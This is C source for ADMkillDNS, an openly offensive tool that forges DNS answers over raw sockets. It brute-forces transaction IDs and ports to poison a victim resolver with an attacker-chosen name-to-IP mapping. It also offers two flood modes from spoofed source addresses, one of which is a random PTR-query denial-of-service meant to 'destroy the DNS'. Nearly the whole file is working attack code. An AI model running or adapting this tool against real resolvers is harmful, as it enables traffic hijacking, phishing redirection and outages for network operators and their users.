
#include "ADM-spoof.c"
#include "dns.h"
#include "ADMDNS2.c"

#define   ERROR     -1
#define   VERSION  "0.3 pub"
#define   ID_START  1
#define   ID_STOP   65535
#define   PORT_START  53
#define   PORT_STOP   54

void main(int argc, char **argv)
   {
        
	 struct   dnshdr *dns;
	 char            *data;
         char            buffer2[4000];
         unsigned char   namez[255];    
	 unsigned long   s_ip,s_ip2;
	 unsigned long   d_ip,d_ip2;
         int sraw, i, on=1, x, loop, idstart, idstop, portstart, portstop;


if(argc <5){
            system("/usr/bin/clear");
            printf(" usage : %s <ip src> <ip dst>  <name> <ip>\n\t[A,B,N] [ID_START] [ID_STOP] [PORT START] [PORT STOP] \n",argv[0]);
            printf(" ip src: ip source of the dns anwser\n");
            printf(" ip dst: ip of the dns victim\n");
            printf(" name  : spoof name ex: www.dede.com\n");
            printf(" ip    : the ip associate with the name\n");
            printf(" options \n");
            printf(" [A,B,N]   \n");
            printf(" A: flood the DNS victim with multiple query\n");
            printf(" B: DOS attack for destroy the DNS \n");
            printf(" N: None attack \n\n");
            printf(" [ID_START]            \n");
            printf(" ID_START: id start :> \n\n");
            printf(" [ID_STOP]             n");
            printf(" ID_STOP : id stop :>  \n\n");
            printf(" PORT START,PORT STOP: send the spoof to the portstart at portstop\n\n");
            printf("\033[01mADMkillDNS %s (c) ADM\033[0m , Heike \n",VERSION);
            exit(ERROR);
            }
 
 dns    = (struct dnshdr  *)buffer2;
 data   = (char *)(buffer2+DNSHDRSIZE);
 bzero(buffer2,sizeof(buffer2));
 
if( (sraw=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR){
   perror("socket");
   exit(ERROR);
   }
   
 
if((setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR){
  perror("setsockopt");
  exit(ERROR);
  }
 
 printf("ADMkillDNS %s",VERSION); 
 printf("\nouais ben mwa je dedie ca a ma Heike");
 printf("\nREADY FOR ACTION!\n"); 

s_ip2=s_ip=host2ip(argv[1]);
d_ip2=d_ip=host2ip(argv[2]);



if(argc>5)if(*argv[5]=='A')
 {
  for(loop=0;loop<10;loop++){
       dns->id      = 6000+loop;
       dns->qr      = 0;
       dns->rd      = 1;
       dns->aa      = 0;
       dns->que_num = htons(1);
       dns->rep_num = htons(0);
       i=makepaketQS(data,argv[3],TYPE_A); 
       udp_send(sraw,s_ip,d_ip,1200+loop,53,buffer2,DNSHDRSIZE+i);         
       s_ip=ntohl(s_ip);
       s_ip++;
       s_ip=htonl(s_ip);
       
       }
   } /* end of DNS flood query */

/* ici on trouve la routine contre un DOS */

if(argc>5)if(*argv[5]=='B')
  {
  	  s_ip=host2ip("100.1.2.3");
          dns->id      = 123;
          dns->rd      = 1;
          dns->que_num = htons(1);
             
     printf("plz enter the number of packet u wanna send\n");
     scanf("%i",&i);         
      for(x=0;x<i;x++){            
                           
                  sprintf(namez,"\3%d\3%d\3%d\3%d\07in-addr\04arpa",myrand(),myrand(),myrand(),myrand());        
                  strcpy(data,namez);
                  *( (u_short *) (data+strlen(namez)+1) ) = ntohs(12);
                  *( (u_short *) (data+strlen(namez)+3) ) = ntohs(1);
                  udp_send(sraw,s_ip,d_ip,2600+myrand(),53,buffer2,14+strlen(namez)+5);
                  s_ip=ntohl(s_ip);
                  s_ip++;
                  s_ip=htonl(s_ip);   
                 printf("send packet num %i:%i\n",x,i);   
            }
      } /* end of DNS DOS */
   
 
if(argc > 6 )idstart = atoi(argv[6]);
else
  idstart = ID_START;
if(argc > 7 )idstop  = atoi(argv[7]);
else
  idstop = ID_STOP;
  
if(argc > 8 ){
  portstart = atoi(argv[8]);
  portstop  = atoi(argv[9]);
  }

 else {
   portstart = PORT_START;
   portstop  = PORT_STOP;
   }
           

bzero(buffer2,sizeof(buffer2));
bzero(namez,sizeof(namez));
i=0;
x=0;
s_ip=s_ip2;
d_ip=d_ip2;


 
    for(;idstart<idstop;idstart++){
       dns->id      = htons(idstart);
       dns->qr      = 1;
       dns->rd      = 1;
       dns->aa      = 1;
       dns->que_num = htons(1);
       dns->rep_num = htons(1);
       printf("send awnser with id %i to port %i at port %i\n",idstart,portstart,portstop);                                          
       i=makepaketAW(data,argv[3],argv[4],TYPE_A);
       for(;x < portstop; x++)
          udp_send(sraw,s_ip,d_ip,53,x,buffer2,DNSHDRSIZE+i);
       x = portstart;
      }  
 
printf(" terminated..\n");
}